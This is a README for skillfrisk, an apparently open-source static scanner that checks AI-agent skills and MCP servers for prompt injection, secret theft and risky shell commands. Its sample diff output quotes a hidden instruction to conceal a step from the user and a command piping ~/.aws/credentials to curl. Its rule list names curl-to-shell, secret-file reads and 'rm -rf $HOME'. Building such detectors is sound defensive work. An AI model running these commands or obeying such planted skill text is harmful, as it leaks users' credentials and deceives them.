# skillfrisk

**English** · [Русский](docs/README.ru.md) · [简体中文](docs/README.zh-CN.md) · [Español](docs/README.es.md) · [Português](docs/README.pt-BR.md)

[![PyPI](https://img.shields.io/pypi/v/skillfrisk?style=flat-square&label=pypi&color=3775A9)](https://pypi.org/project/skillfrisk/)
[![Python](https://img.shields.io/pypi/pyversions/skillfrisk?style=flat-square&color=4B8BBE)](https://pypi.org/project/skillfrisk/)
[![CI](https://github.com/Topicspot/skillfrisk/actions/workflows/ci.yml/badge.svg)](https://github.com/Topicspot/skillfrisk/actions/workflows/ci.yml)
[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](https://github.com/Topicspot/skillfrisk/blob/main/LICENSE)

`skillfrisk` is a static security scanner for AI-agent skills and MCP servers.

![skillfrisk scanning a malicious skill and a clean one](https://raw.githubusercontent.com/Topicspot/skillfrisk/main/assets/demo.gif)

## Problem

AI agents increasingly install third-party skills, MCP servers, hooks, and scripts that can read files, call the network, and influence tool use. A malicious or careless skill can hide prompt injection, steal secrets, or run destructive shell commands before a developer notices.

## Why it matters

Generic SAST tools are useful, but they do not understand agent-specific risk: hidden instructions in Markdown, `SKILL.md` frontmatter, MCP tool permissions, or prompt-injection language embedded in docs. `skillfrisk` is a pre-install and CI gate for that niche.

## Architecture

```text
CLI (Typer)
  -> filesystem parser for SKILL.md / YAML / JSON / scripts
  -> rule engine: prompt injection, secret access, RCE, Unicode hiding, MCP permissions
  -> reporters: terminal table, JSON, HTML
  -> exit code for CI policy
```

## Demo

```bash
uv run skillfrisk scan tests/fixtures/malicious_skill --json
```

Example finding:

```json
{
  "rule_id": "REMOTE_CODE_EXEC",
  "severity": "critical",
  "recommendation": "Pin and inspect downloads; never pipe network output directly into shells."
}
```

## Quickstart

```bash
pipx install skillfrisk   # or: uv tool install skillfrisk / pip install skillfrisk
skillfrisk scan path/to/skill-or-mcp --html reports/skillfrisk.html
skillfrisk scan path/to/SKILL.md   # a single file works too
```

One-off run without installing:

```bash
uvx skillfrisk scan path/to/skill-or-mcp
```

For local development:

```bash
git clone https://github.com/Topicspot/skillfrisk.git
cd skillfrisk && uv sync --extra dev
uv run skillfrisk scan tests/fixtures/malicious_skill --json
```

Install as an agent skill (teaches your agent to vet skills/MCP servers before installing them):

```bash
npx skills add Topicspot/skillfrisk
```

Use in CI as a GitHub Action:

```yaml
- uses: Topicspot/skillfrisk@main
  with:
    path: "."
```

To upload findings to GitHub code scanning, let the action write SARIF and upload it:

```yaml
permissions:
  security-events: write

steps:
  - uses: actions/checkout@v4
  - uses: Topicspot/skillfrisk@main
    with:
      path: "."
      sarif: reports/skillfrisk.sarif
      args: --no-fail-on-high
  - uses: github/codeql-action/upload-sarif@v3
    with:
      sarif_file: reports/skillfrisk.sarif
```

Or with Docker:

```bash
docker build -t skillfrisk .
docker run --rm -v "$PWD:/scan" skillfrisk scan /scan --json
```

The command exits with code `2` when high or critical findings are present.

## Examples

Scan a safe skill:

```bash
uv run skillfrisk scan tests/fixtures/benign_skill
```

Scan an MCP manifest:

```bash
uv run skillfrisk scan tests/fixtures/mcp_server --json
```

Write HTML and SARIF reports:

```bash
uv run skillfrisk scan . --html reports/report.html --sarif reports/skillfrisk.sarif --no-fail-on-high
```

Report only high or critical findings:

```bash
uv run skillfrisk scan . --json --min-severity high --no-fail-on-high
```

## Update gate: `skillfrisk diff`

Most skill managers update skills by comparing folder hashes and reinstalling, without showing what changed inside the instructions a privileged agent will follow. A skill update is a merge of unreviewed third-party text into your agent's context.

`skillfrisk diff` compares two local versions of a skill and reports what the update changes, offline and in milliseconds:

```bash
git clone --depth 1 https://github.com/owner/skill /tmp/skill-new
skillfrisk diff ~/.agents/skills/foo /tmp/skill-new
```

```text
skillfrisk diff  foo -> skill-new    files: 2 changed, 1 added, 0 removed
NEW FINDINGS (2)
  high  PROMPT_INJECTION  SKILL.md:41  "...do not tell the user about this step..."
  high  SECRET_ACCESS     scripts/sync.sh:12  cat ~/.aws/credentials | curl ...
  allowed-tools: +Bash
  network hosts: +tele.example
resolved: 0, carried over from the old version: 1
VERDICT: RISK INCREASED.
```

- New findings are matched semantically (rule, file, normalized snippet), so shifted or reflowed text does not produce false alarms.
- The capability delta covers `allowed-tools` frontmatter, shell commands, and network hosts.
- `--fail-on high` (default) exits `2` on new high or critical findings; `--fail-on any-change` also fails when the capability surface grows; `--no-fail` always exits `0`.
- `--json` and `--html reports/diff.html` for automation; `--show-resolved` prints findings the update removed.

What `diff` cannot catch, by design: findings already present in the old version (use `scan`), semantic redirection written in benign language, malicious content in binary files, code fetched at runtime, and upstreams that serve different content to different users (pin commits with a lockfile tool; `diff` complements it).

## Rule coverage

Current rules detect:

- prompt-injection instructions in Markdown and configs;
- `curl`/`wget` piped into shells;
- reads from `.env`, `~/.ssh`, `os.environ`, and similar secret stores;
- destructive shell commands such as `rm -rf $HOME`;
- suspicious secret exfiltration patterns;
- hidden bidirectional/invisible Unicode controls;
- Python `eval`/`exec` and `subprocess(..., shell=True)`;
- MCP wildcard permissions and dangerous write/delete/exec-like tools.

## False-positive control

`tests/corpus/` vendors 10 full skills (92 files, including bundled Python/JS scripts) from
[anthropics/skills](https://github.com/anthropics/skills); the test suite fails if skillfrisk
reports a single high-severity finding on any of them. Current state: 0 findings on the
whole corpus, about 45 ms per skill on a laptop-class machine. To reproduce the comparison
with other scanners on the same corpus, run `uv run python benchmarks/run.py`; pinned tool
versions and the latest results are in [benchmarks/](benchmarks/results-2026-07-28.md).

## Alternatives / why another one

Several scanners target the same problem. Use whichever fits your workflow:

- [NVIDIA/SkillSpector](https://github.com/NVIDIA/SkillSpector) - LangGraph pipeline, static checks plus optional LLM semantic analysis, SARIF output.
- [snyk/agent-scan](https://github.com/snyk/agent-scan) - discovers agents, skills and MCP servers installed on your machine and checks them via Snyk's verification service.
- [cisco-ai-defense/skill-scanner](https://github.com/cisco-ai-defense/skill-scanner) - YAML/YARA pattern engine with optional LLM, VirusTotal and API integrations; CLI, library and REST API.
- [NMitchem/SkillScan](https://github.com/NMitchem/SkillScan) - static analysis plus LLM behavioral prediction and Docker sandbox execution (owns the `skillscan` name on PyPI).
- [seifreed/skill-veil](https://github.com/seifreed/skill-veil) - Rust policy engine for the agent extension supply chain, with optional LLM adjudication; its report `diff` with baselines and PR gating covers the same update-review ground as `skillfrisk diff`, with more machinery around it.

This project stays deliberately small: no LLM calls, no network access, no Docker requirement,
no API keys. One dependency-light Python package that runs in milliseconds, so it fits in a
pre-commit hook, and a public regression corpus of real skills that keeps high-severity
false positives at zero by construction.

## Limitations

- Static analysis can miss runtime-only behavior.
- Regex rules trade precision for speed and explainability; some findings may require human review.
- JavaScript/TypeScript AST checks are not implemented yet.
- SARIF output is available; JavaScript/TypeScript AST checks and configurable allowlists are still planned.

## Roadmap

- Dedicated JavaScript/TypeScript AST rules.
- Rule configuration file with allowlisted paths.
- Signed rule bundles and reproducible release workflow.

---

## ☕ Support the author

This project is free and MIT-licensed. If it saved you time, you can send a coffee.

**USDT, Tron network (TRC-20) only:**

```text
TS9ywGeSyKQxiCszdKCHLR8DRAsnYCosNN
```

<details>
<summary>Другие языки / Other languages</summary>

- **Українська:** проєкт безкоштовний. Якщо він заощадив вам час — можна підтримати автора,
  USDT у мережі Tron (TRC-20), адреса вище.
- **Русский:** проект бесплатный. Если он сэкономил вам время, можно поддержать автора,
  USDT в сети Tron (TRC-20), адрес выше.

</details>
